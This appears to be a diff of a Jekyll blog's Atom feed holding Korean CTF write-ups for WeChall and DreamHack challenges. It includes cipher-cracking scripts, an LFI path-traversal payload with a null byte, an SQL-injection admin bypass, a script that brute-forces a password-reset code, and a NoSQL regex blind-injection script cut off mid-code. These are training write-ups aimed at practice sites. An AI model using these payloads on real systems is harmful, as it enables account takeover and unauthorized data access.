- C = (P + K) % 26&lt;/p&gt;
-
-&lt;p&gt;이러한 치환 암호의 문제점은 알파벳의 출현 빈도 수가 그대로 노출되어 암호문에 남아있다는 것이다. 이떄 통계적 성질을 이용하여 암호를 풀어낼 수 있다.
- 보통 알파벳의 경우 e, t, a, s, i, n, … 순으로 출현 빈도가 나타난다.&lt;/p&gt;
-
-&lt;p&gt;보통 치환 암호는 암호문과 암호키 간의 관계를 숨기는 혼돈(confusion)의 성질을 만족시킨다.&lt;/p&gt;
-
-&lt;p&gt;이번 문제에서는 아스키 코드를 사용할 수 있도록 하여 키의 크기가 26에서 128로 늘어났다는 점에 주의한다.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-Python&quot;&gt;ciphertext = &quot;63 0B 0B 00 20 06 0B 7E 48 20 15 0B 11 20 0F 0B\
- 08 12 01 00 20 0B 0A 01 20 09 0B 0E 01 20 7F 04\
- 7D 08 08 01 0A 03 01 20 05 0A 20 15 0B 11 0E 20\
- 06 0B 11 0E 0A 01 15 4A 20 70 04 05 0F 20 0B 0A\
- 01 20 13 7D 0F 20 02 7D 05 0E 08 15 20 01 7D 0F\
- 15 20 10 0B 20 7F 0E 7D 7F 07 4A 20 73 7D 0F 0A\
- 43 10 20 05 10 5B 20 4D 4E 54 20 07 01 15 0F 20\
- 05 0F 20 7D 20 0D 11 05 10 01 20 0F 09 7D 08 08\
- 20 07 01 15 0F 0C 7D 7F 01 48 20 0F 0B 20 05 10\
- 20 0F 04 0B 11 08 00 0A 43 10 20 04 7D 12 01 20\
- 10 7D 07 01 0A 20 15 0B 11 20 10 0B 0B 20 08 0B\
- 0A 03 20 10 0B 20 00 01 7F 0E 15 0C 10 20 10 04\
- 05 0F 20 09 01 0F 0F 7D 03 01 4A 20 73 01 08 08\
- 20 00 0B 0A 01 48 20 15 0B 11 0E 20 0F 0B 08 11\
- 10 05 0B 0A 20 05 0F 20 00 02 0C 05 02 05 09 0A\
- 03 05 0F 04 4A&quot;
-cipher = ciphertext.split(&quot; &quot;)
-
-for j in range(0, 127):
-	for i in cipher:
-		print(chr((int(&quot;0x&quot; + i, 0)+j)%128), end=&quot;&quot;)
-	print(&quot;&quot;)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;위 코드를 실행시키면 결과물 중 아래와 같은 문장을 얻을 수 있다.&lt;/p&gt;
-
-&lt;p&gt;Goodjob,yousolvedonemorechallengeinyourjourney.Thisonewasfairlyeasytocrack.Wasn’tit?128keysisaquitesmallkeyspace,soitshouldn’thavetakenyoutoolongtodecryptthismessage.Welldone,yoursolutionisdfpifimngish.&lt;/p&gt;
-
-&lt;p&gt;출처: http://www.wechall.net/challenge/training/crypto/caesar2/index.php&lt;/p&gt;
-
-&lt;h1 id=&quot;wechall-training-transposition-2-write-up&quot;&gt;(Wechall) Training Transposition 2 write up&lt;/h1&gt;
-&lt;p&gt;전치 암호는 key에 따라 문자의 순서를 바꾸는 암호화 방식이다.&lt;/p&gt;
-
-&lt;p&gt;전치 암호는 암호문과 평문의 관계를 숨기는 확산(Difussion) 성질을 만족시킨다.&lt;/p&gt;
-
-&lt;p&gt;‘oWdnreuf’에서 암호화 키가 [2, 1]임을 유추할 수 있다.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-Python&quot;&gt;cipher = &quot;oWdnreuf.lY uoc nar ae dht eemssga eaw yebttrew eh nht eelttre srax enic roertco drre.Ihtni koy uowlu dilekt oes eoyrup sawsro don: wc lfoediorbp.e&quot;
-keysize = 2
-key = [2, 1]
-
-for i in range(0, int(len(cipher)/keysize)):
-	snippet = cipher[i*keysize:i*keysize+keysize]
-	for k in key:
-		print(snippet[k-1], end=&quot;&quot;)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Wonderful. You can read the message way better when the letters are in correct order. I think you would like to see your password now: cfleoidropbe.&lt;/p&gt;
-
-&lt;p&gt;출처: http://www.wechall.net/challenge/training/crypto/transposition1/index.php&lt;/p&gt;
-
-&lt;h1 id=&quot;wechall-training-php-lfi-local-file-inclusion-write-up&quot;&gt;(Wechall) Training PHP LFI (Local File Inclusion) write up&lt;/h1&gt;
-
-&lt;p&gt;LFI 취약점은 공격 대상 서버에 있는 파일을 포함시켜 공격한다. 보통 include 부분에 입력값 검증 등 적절한 보안 조치가 없을 경우에 발생한다.
-cf. RFI (Remote File Inclusion)&lt;/p&gt;
-
-&lt;p&gt;filename에 대한 검증 없이 include를 해 취약점 발생&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&quot;language-PHP&quot;&gt;$filename = 'pages/'.(isset($_GET[&quot;file&quot;])?$_GET[&quot;file&quot;]:&quot;welcome&quot;).'.html';
-include $filename;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;?file=../../solution.php 를 통해 해당 파일을 불러오고 %00을 통해 끝에 .html이 붙지 않도록 한다. (Null byte injection)&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&quot;language-PHP&quot;&gt;https://www.wechall.net/challenge/training/php/lfi/up/index.php?file=../../solution.php%00
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;출처: http://www.wechall.net/challenge/training/php/lfi/up/index.php&lt;/p&gt;</content><author><name>Yongjin Han</name></author><summary type="html">(Wechall) Training Regex write up</summary></entry><entry><title type="html">(Wechall) MySQL I</title><link href="http://localhost:4000/security/(Wechall)-MYSQL1/" rel="alternate" type="text/html" title="(Wechall) MySQL I" /><published>2021-01-13T18:24:00+09:00</published><updated>2021-01-13T18:24:00+09:00</updated><id>http://localhost:4000/security/(Wechall)-MYSQL1</id><content type="html" xml:base="http://localhost:4000/security/(Wechall)-MYSQL1/">&lt;h1 id=&quot;wechall-mysql-1-write-up&quot;&gt;(Wechall) MySQL 1 write up&lt;/h1&gt;
-
-&lt;p&gt;아래 주어진 코드를 통해 쿼리문을 살펴보면 쿼리문에 대해 별다른 처리가 되지 않은 것을 알 수 있다. (prepared statement x)
-따라서 사용자 입력 값에 따라 DB를 조회하는 SQL injection 취약점이 존재한다.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/24788751/104435989-66baaa80-55d0-11eb-9efb-4180f83373eb.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;위 값을 입력하여 admin 계정으로 시스템에 로그인을 시도했다.
-admin은 관리자 계정, ‘는 username 값이 끝났음을 명시한다. 주석처리#을 통해서 이후 오는 조건절을 무시하도록 한다.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-Java&quot;&gt;/**
- * Exploit this!
- * @param WC_Challenge $chall
- * @param unknown_type $username
- * @param unknown_type $password
- * @return boolean
- */
-function auth1_onLogin(WC_Challenge $chall, $username, $password)
-{
-	$db = auth1_db();
-	
-	$password = md5($password);
-	
-	$query = &quot;SELECT * FROM users WHERE username='$username' AND password='$password'&quot;;
-	
-	if (false === ($result = $db-&amp;gt;queryFirst($query))) {
-		echo GWF_HTML::error('Auth1', $chall-&amp;gt;lang('err_unknown'), false); # Unknown user
-		return false;
-	}
-
-	# Welcome back!
-	echo GWF_HTML::message('Auth1', $chall-&amp;gt;lang('msg_welcome_back', htmlspecialchars($result['username'])), false);
-	
-	# Challenge solved?
-	if (strtolower($result['username']) === 'admin') {
-		$chall-&amp;gt;onChallengeSolved(GWF_Session::getUserID());
-	}
-	
-	return true;
-}
-&lt;/code&gt;&lt;/pre&gt;</content><author><name>Yongjin Han</name></author><summary type="html">(Wechall) MySQL 1 write up</summary></entry></feed>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="https://dalnaracrater.github.io/feed.xml" rel="self" type="application/atom+xml"/><link href="https://dalnaracrater.github.io/" rel="alternate" type="text/html" hreflang="en"/><updated>2023-12-07T14:14:01+00:00</updated><id>https://dalnaracrater.github.io/feed.xml</id><title type="html">blank</title><subtitle>A simple, whitespace theme for academics. Based on [*folio](https://github.com/bogoli/-folio) design. </subtitle><entry><title type="html">Displaying External Posts on Your al-folio Blog</title><link href="https://dalnaracrater.github.io/blog/2022/displaying-external-posts-on-your-al-folio-blog/" rel="alternate" type="text/html" title="Displaying External Posts on Your al-folio Blog"/><published>2022-04-23T23:20:09+00:00</published><updated>2022-04-23T23:20:09+00:00</updated><id>https://dalnaracrater.github.io/blog/2022/displaying-external-posts-on-your-al-folio-blog</id><content type="html" xml:base="https://dalnaracrater.github.io/blog/2022/displaying-external-posts-on-your-al-folio-blog/"><![CDATA[]]></content><author><name></name></author></entry><entry><title type="html">a post with redirect</title><link href="https://dalnaracrater.github.io/blog/2022/redirect/" rel="alternate" type="text/html" title="a post with redirect"/><published>2022-02-01T17:39:00+00:00</published><updated>2022-02-01T17:39:00+00:00</updated><id>https://dalnaracrater.github.io/blog/2022/redirect</id><content type="html" xml:base="https://dalnaracrater.github.io/blog/2022/redirect/"><![CDATA[<p>Redirecting to another page.</p>]]></content><author><name></name></author><summary type="html"><![CDATA[you can also redirect to assets like pdf]]></summary></entry><entry><title type="html">a post with diagrams</title><link href="https://dalnaracrater.github.io/blog/2021/diagrams/" rel="alternate" type="text/html" title="a post with diagrams"/><published>2021-07-04T17:39:00+00:00</published><updated>2021-07-04T17:39:00+00:00</updated><id>https://dalnaracrater.github.io/blog/2021/diagrams</id><content type="html" xml:base="https://dalnaracrater.github.io/blog/2021/diagrams/"><![CDATA[<p>This theme supports generating various diagrams from a text description using <a href="https://github.com/zhustec/jekyll-diagrams" target="\_blank">jekyll-diagrams</a> plugin. Below, we generate a few examples of such diagrams using languages such as <a href="https://mermaid-js.github.io/mermaid/" target="\_blank">mermaid</a>, <a href="https://plantuml.com/" target="\_blank">plantuml</a>, <a href="https://vega.github.io/vega-lite/" target="\_blank">vega-lite</a>, etc.</p> <p><strong>Note:</strong> different diagram-generation packages require external dependencies to be installed on your machine. Also, be mindful of that because of diagram generation the fist time you build your Jekyll website after adding new diagrams will be SLOW. For any other details, please refer to <a href="https://github.com/zhustec/jekyll-diagrams" target="\_blank">jekyll-diagrams</a> README.</p> <h2 id="mermaid">Mermaid</h2> <p>Install mermaid using <code class="language-plaintext highlighter-rouge">node.js</code> package manager <code class="language-plaintext highlighter-rouge">npm</code> by running the following command:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>npm <span class="nb">install</span> <span class="nt">-g</span> mermaid.cli
+</code></pre></div></div> <p>The diagram below was generated by the following code:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{% mermaid %}
+sequenceDiagram
+    participant John
+    participant Alice
+    Alice-&gt;&gt;John: Hello John, how are you?
+    John--&gt;&gt;Alice: Great!
+{% endmermaid %}
+</code></pre></div></div> <div class="jekyll-diagrams diagrams mermaid"> Command Not Found: mmdc </div>]]></content><author><name></name></author><category term="formatting"/><category term="diagrams"/><summary type="html"><![CDATA[an example of a blog post with diagrams]]></summary></entry><entry><title type="html">(DreamHack) login-1</title><link href="https://dalnaracrater.github.io/blog/2021/(DreamHack)-login-1/" rel="alternate" type="text/html" title="(DreamHack) login-1"/><published>2021-06-01T09:24:00+00:00</published><updated>2021-06-01T09:24:00+00:00</updated><id>https://dalnaracrater.github.io/blog/2021/(DreamHack)-login-1</id><content type="html" xml:base="https://dalnaracrater.github.io/blog/2021/(DreamHack)-login-1/"><![CDATA[<h2 id="풀이">풀이</h2> <p>플래그를 얻기 위해서는 유저 레벨이 ‘admin’인 계정으로 로그인해야 한다.</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">userLevel</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="mi">0</span> <span class="p">:</span> <span class="sh">'</span><span class="s">guest</span><span class="sh">'</span><span class="p">,</span>
+    <span class="mi">1</span> <span class="p">:</span> <span class="sh">'</span><span class="s">admin</span><span class="sh">'</span>
+<span class="p">}</span>
+<span class="n">MAXRESETCOUNT</span> <span class="o">=</span> <span class="mi">5</span>
+
+<span class="k">try</span><span class="p">:</span>
+    <span class="n">FLAG</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="sh">'</span><span class="s">./flag.txt</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">r</span><span class="sh">'</span><span class="p">).</span><span class="nf">read</span><span class="p">()</span>
+<span class="k">except</span><span class="p">:</span>
+    <span class="n">FLAG</span> <span class="o">=</span> <span class="sh">'</span><span class="s">[**FLAG**]</span><span class="sh">'</span>
+
+<span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/admin</span><span class="sh">'</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">admin</span><span class="p">():</span>
+    <span class="k">if</span> <span class="n">session</span> <span class="ow">and</span> <span class="p">(</span><span class="n">session</span><span class="p">[</span><span class="sh">'</span><span class="s">level</span><span class="sh">'</span><span class="p">]</span> <span class="o">==</span> <span class="n">userLevel</span><span class="p">[</span><span class="mi">1</span><span class="p">]):</span>
+        <span class="k">return</span> <span class="n">FLAG</span>
+
+    <span class="k">return</span> <span class="sh">"</span><span class="s">Only Admin !</span><span class="sh">"</span>
+</code></pre></div></div> <p>userid를 클릭하면 아래와 같은 화면이 나온다. 이때 url에 있는 17이란 숫자가 user에 부여되는 특정 id라고 가정하여 해당 숫자를 변경해 보았다. <img src="https://user-images.githubusercontent.com/24788751/120293279-0cf91980-c300-11eb-9c7f-aa502b0a3816.png" alt="image"/></p> <p>이때 potato라는 사용자의 유저 레벨이 1인 것을 확인하였다.</p> <p><img src="https://user-images.githubusercontent.com/24788751/120293014-cf948c00-c2ff-11eb-9c89-ab0a6e23ffae.PNG" alt="admin1"/></p> <p>비밀번호 찾기를 통해 비밀번호를 수정하도록 한다.</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">makeBackupcode</span><span class="p">():</span>
+    <span class="k">return</span> <span class="n">random</span><span class="p">.</span><span class="nf">randrange</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span>
+
+<span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/forgot_password</span><span class="sh">'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">'</span><span class="s">GET</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">POST</span><span class="sh">'</span><span class="p">])</span>
+<span class="k">def</span> <span class="nf">forgot_password</span><span class="p">():</span>
+    <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span> <span class="o">==</span> <span class="sh">'</span><span class="s">GET</span><span class="sh">'</span><span class="p">:</span>
+        <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">forgot.html</span><span class="sh">'</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">userid</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">userid</span><span class="sh">"</span><span class="p">)</span>
+        <span class="n">newpassword</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">newpassword</span><span class="sh">"</span><span class="p">)</span>
+        <span class="n">backupCode</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">backupCode</span><span class="sh">"</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">int</span><span class="p">)</span>
+
+        <span class="n">conn</span> <span class="o">=</span> <span class="nf">get_db</span><span class="p">()</span>
+        <span class="n">cur</span> <span class="o">=</span> <span class="n">conn</span><span class="p">.</span><span class="nf">cursor</span><span class="p">()</span>
+        <span class="n">user</span> <span class="o">=</span> <span class="n">cur</span><span class="p">.</span><span class="nf">execute</span><span class="p">(</span><span class="sh">'</span><span class="s">SELECT * FROM user WHERE id = ?</span><span class="sh">'</span><span class="p">,</span> <span class="p">(</span><span class="n">userid</span><span class="p">,)).</span><span class="nf">fetchone</span><span class="p">()</span>
+        <span class="k">if</span> <span class="n">user</span><span class="p">:</span>
+            <span class="c1"># security for brute force Attack.
+</span>            <span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+            <span class="k">if</span> <span class="n">user</span><span class="p">[</span><span class="sh">'</span><span class="s">resetCount</span><span class="sh">'</span><span class="p">]</span> <span class="o">==</span> <span class="n">MAXRESETCOUNT</span><span class="p">:</span>
+                <span class="k">return</span> <span class="sh">"</span><span class="s">&lt;script&gt;alert(</span><span class="sh">'</span><span class="s">reset Count Exceed.</span><span class="sh">'</span><span class="s">);history.back(-1);&lt;/script&gt;</span><span class="sh">"</span>
+            
+            <span class="k">if</span> <span class="n">user</span><span class="p">[</span><span class="sh">'</span><span class="s">backupCode</span><span class="sh">'</span><span class="p">]</span> <span class="o">==</span> <span class="n">backupCode</span><span class="p">:</span>
+                <span class="n">newbackupCode</span> <span class="o">=</span> <span class="nf">makeBackupcode</span><span class="p">()</span>
+                <span class="n">updateSQL</span> <span class="o">=</span> <span class="sh">"</span><span class="s">UPDATE user set pw = ?, backupCode = ?, resetCount = 0 where idx = ?</span><span class="sh">"</span>
+                <span class="n">cur</span><span class="p">.</span><span class="nf">execute</span><span class="p">(</span><span class="n">updateSQL</span><span class="p">,</span> <span class="p">(</span><span class="n">hashlib</span><span class="p">.</span><span class="nf">sha256</span><span class="p">(</span><span class="n">newpassword</span><span class="p">.</span><span class="nf">encode</span><span class="p">()).</span><span class="nf">hexdigest</span><span class="p">(),</span> <span class="n">newbackupCode</span><span class="p">,</span> <span class="nf">str</span><span class="p">(</span><span class="n">user</span><span class="p">[</span><span class="sh">'</span><span class="s">idx</span><span class="sh">'</span><span class="p">])))</span>
+                <span class="n">msg</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="s">&lt;b&gt;Password Change Success.&lt;/b&gt;&lt;br/&gt;New BackupCode : </span><span class="si">{</span><span class="n">newbackupCode</span><span class="si">}</span><span class="sh">"</span>
+
+            <span class="k">else</span><span class="p">:</span>
+                <span class="n">updateSQL</span> <span class="o">=</span> <span class="sh">"</span><span class="s">UPDATE user set resetCount = resetCount+1 where idx = ?</span><span class="sh">"</span>
+                <span class="n">cur</span><span class="p">.</span><span class="nf">execute</span><span class="p">(</span><span class="n">updateSQL</span><span class="p">,</span> <span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">user</span><span class="p">[</span><span class="sh">'</span><span class="s">idx</span><span class="sh">'</span><span class="p">])))</span>
+                <span class="n">msg</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="s">Wrong BackupCode !&lt;br/&gt;&lt;b&gt;Left Count : &lt;/b&gt; </span><span class="si">{</span><span class="p">(</span><span class="n">MAXRESETCOUNT</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">-</span><span class="n">user</span><span class="p">[</span><span class="sh">'</span><span class="s">resetCount</span><span class="sh">'</span><span class="p">]</span><span class="si">}</span><span class="sh">"</span>
+            
+            <span class="n">conn</span><span class="p">.</span><span class="nf">commit</span><span class="p">()</span>
+            <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">"</span><span class="s">index.html</span><span class="sh">"</span><span class="p">,</span> <span class="n">msg</span><span class="o">=</span><span class="n">msg</span><span class="p">)</span>
+
+        <span class="k">return</span> <span class="sh">"</span><span class="s">&lt;script&gt;alert(</span><span class="sh">'</span><span class="s">User Not Found.</span><span class="sh">'</span><span class="s">);history.back(-1);&lt;/script&gt;</span><span class="sh">"</span><span class="p">;</span>
+</code></pre></div></div> <p>백업 코드는 0이상 100미만의 수가 생성되기 때문에 브루트포스 방식을 통해 백업코드를 찾고 원하는 비밀번호로 변경할 수 있도록 하였다.</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">json</span>
+<span class="kn">import</span> <span class="n">requests</span>
+
+<span class="n">u</span> <span class="o">=</span> <span class="sh">"</span><span class="s">http://host1.dreamhack.games:17892/forgot_password</span><span class="sh">"</span>
+<span class="n">userid</span> <span class="o">=</span> <span class="sh">"</span><span class="s">potato</span><span class="sh">"</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">100</span><span class="p">):</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="sh">'</span><span class="s">userid</span><span class="sh">'</span><span class="p">:</span> <span class="sh">"</span><span class="s">potato</span><span class="sh">"</span><span class="p">,</span> <span class="sh">'</span><span class="s">backupCode</span><span class="sh">'</span><span class="p">:</span> <span class="n">i</span><span class="p">,</span> <span class="sh">'</span><span class="s">newpassword</span><span class="sh">'</span><span class="p">:</span><span class="sh">"</span><span class="s">aaa</span><span class="sh">"</span><span class="p">}</span>
+    <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">u</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">res</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
+        <span class="nf">print</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="sh">"</span><span class="s"> was backup code</span><span class="sh">"</span><span class="p">)</span>
+        <span class="nf">print</span><span class="p">(</span><span class="n">res</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span> <span class="c1"># 500
+</span>        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">-</span><span class="sh">"</span><span class="p">)</span>
+</code></pre></div></div>]]></content><author><name></name></author><category term="Security"/><category term="CTF"/><summary type="html"><![CDATA[풀이 플래그를 얻기 위해서는 유저 레벨이 ‘admin’인 계정으로 로그인해야 한다.]]></summary></entry><entry><title type="html">(DreamHack) web-misconf-1</title><link href="https://dalnaracrater.github.io/blog/2021/(DreamHack)-web-misconf-1/" rel="alternate" type="text/html" title="(DreamHack) web-misconf-1"/><published>2021-06-01T09:24:00+00:00</published><updated>2021-06-01T09:24:00+00:00</updated><id>https://dalnaracrater.github.io/blog/2021/(DreamHack)-web-misconf-1</id><content type="html" xml:base="https://dalnaracrater.github.io/blog/2021/(DreamHack)-web-misconf-1/"><![CDATA[<p>네트워크 장비, CCTV 등 여러 전자제품은 구매를 하면 초기 비밀번호가 설정되어 있다. 그런데 구입 후 이를 변경해주지 않으면 이를 악용할 수 있는 가능성이 존재한다. 해당 문제도 비슷한 시각에서 출제된 문제라고 생각한다.</p> <h2 id="풀이">풀이</h2> <p>접속하면 다음과 같은 화면이 출력된다.</p> <p><img src="https://user-images.githubusercontent.com/24788751/120296923-91996700-c303-11eb-8b0b-61b4b4fb4fd8.png" alt="image"/></p> <p>회원가입 기능이 따로 없어 admin/admin으로 로그인 시도를 해보았는데 성공하였다.</p> <p>문제에서 flag가 Organization에 있다고 했으므로 설정을 확인하여 플래그를 찾을 수 있었다.</p>]]></content><author><name></name></author><category term="Security"/><category term="CTF"/><summary type="html"><![CDATA[web-misconf]]></summary></entry><entry><title type="html">(DreamHack) Mango</title><link href="https://dalnaracrater.github.io/blog/2021/(DreamHack)-mango/" rel="alternate" type="text/html" title="(DreamHack) Mango"/><published>2021-05-25T09:24:00+00:00</published><updated>2021-05-25T09:24:00+00:00</updated><id>https://dalnaracrater.github.io/blog/2021/(DreamHack)-mango</id><content type="html" xml:base="https://dalnaracrater.github.io/blog/2021/(DreamHack)-mango/"><![CDATA[<p>NoSQL은 RDMS와는 달리 쿼리문 없이도 데이터베이스에 저장된 데이터를 조작할 수 있는 개념이다. 본 문제에서는 NoSQL에 Blind injection을 수행하여 안에 저장된 데이터를 조회하도록 한다.</p> <p>Mongo db는 대표적인 NoSQL이며, 비교 연산자, 논리 연산자를 기본적으로 사용할 수 있고, $regex, $where, $elemMatch 연산자를 통해 좀 더 다양한 기능을 수행할 수 있다.</p> <h2 id="풀이">풀이</h2> <p>BAN 변수에는 ‘admin’, ‘dh’, ‘admi’의 문자열이 포함되게 되면 필터링하게 되어있다. 따라서 필터링 되지 않도록 $ne guest를 사용하여 admin을 검색할 수 있도록 하였다.</p> <div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// flag is in db, {'uid': 'admin', 'upw': 'DH{32alphanumeric}'}</span>
+<span class="kd">const</span> <span class="nx">BAN</span> <span class="o">=</span> <span class="p">[</span><span class="dl">'</span><span class="s1">admin</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">dh</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">admi</span><span class="dl">'</span><span class="p">];</span>
+
+<span class="nx">filter</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">data</span><span class="p">){</span>
+    <span class="kd">const</span> <span class="nx">dump</span> <span class="o">=</span> <span class="nx">JSON</span><span class="p">.</span><span class="nf">stringify</span><span class="p">(</span><span class="nx">data</span><span class="p">).</span><span class="nf">toLowerCase</span><span class="p">();</span>
+    <span class="kd">var</span> <span class="nx">flag</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
+    <span class="nx">BAN</span><span class="p">.</span><span class="nf">forEach</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">word</span><span class="p">){</span>
+        <span class="k">if</span><span class="p">(</span><span class="nx">dump</span><span class="p">.</span><span class="nf">indexOf</span><span class="p">(</span><span class="nx">word</span><span class="p">)</span><span class="o">!=-</span><span class="mi">1</span><span class="p">)</span> <span class="nx">flag</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+    <span class="p">});</span>
+    <span class="k">return</span> <span class="nx">flag</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="nx">app</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">/login</span><span class="dl">'</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">if</span><span class="p">(</span><span class="nf">filter</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">)){</span>
+        <span class="nx">res</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="dl">'</span><span class="s1">filter</span><span class="dl">'</span><span class="p">);</span>
+        <span class="k">return</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="kd">const</span> <span class="p">{</span><span class="nx">uid</span><span class="p">,</span> <span class="nx">upw</span><span class="p">}</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">;</span>
+
+    <span class="nx">db</span><span class="p">.</span><span class="nf">collection</span><span class="p">(</span><span class="dl">'</span><span class="s1">user</span><span class="dl">'</span><span class="p">).</span><span class="nf">findOne</span><span class="p">({</span>
+        <span class="dl">'</span><span class="s1">uid</span><span class="dl">'</span><span class="p">:</span> <span class="nx">uid</span><span class="p">,</span>
+        <span class="dl">'</span><span class="s1">upw</span><span class="dl">'</span><span class="p">:</span> <span class="nx">upw</span><span class="p">,</span>
+    <span class="p">},</span> <span class="kd">function</span><span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="nx">result</span><span class="p">){</span>
+        <span class="k">if </span><span class="p">(</span><span class="nx">err</span><span class="p">){</span>
+            <span class="nx">res</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="dl">'</span><span class="s1">err</span><span class="dl">'</span><span class="p">);</span>
+        <span class="p">}</span><span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="nx">result</span><span class="p">){</span>
+            <span class="nx">res</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="nx">result</span><span class="p">[</span><span class="dl">'</span><span class="s1">uid</span><span class="dl">'</span><span class="p">]);</span>
+        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+            <span class="nx">res</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="dl">'</span><span class="s1">undefined</span><span class="dl">'</span><span class="p">);</span>
+        <span class="p">}</span>
+    <span class="p">})</span>
+<span class="p">});</span>
+</code></pre></div></div> <p>BAN에 dh가 있기 때문에 이를 피하기 위해 [D]를 사용했으며, brute force방식과 유사하게 모든 경우의 수를 탐색할 수 있도록 하였다.</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">requests</span>
+
+<span class="nb">ascii</span> <span class="o">=</span><span class="sh">'</span><span class="s">abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789</span><span class="sh">'</span>
+
+<span class="k">def</span> <span class="nf">url</span><span class="p">(</span><span class="n">pwd</span><span class="p">):</span>
+    <span class="n">params</span> <span class="o">=</span> <span class="p">{</span><span class="sh">'</span><span class="s">uid[$ne]</span><span class="sh">'</span><span class="p">:</span><span class="sh">'</span><span class="s">guest</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">upw[$regex]</span><span class="sh">'</span><span class="p">:</span><span class="n">pwd</span><span class="p">}</span> <span class="c1">#uid=[adm]in 등으로 해주어도 된다.
+</span>    <span class="n">port</span> <span class="o">=</span> <span class="mi">15108</span>
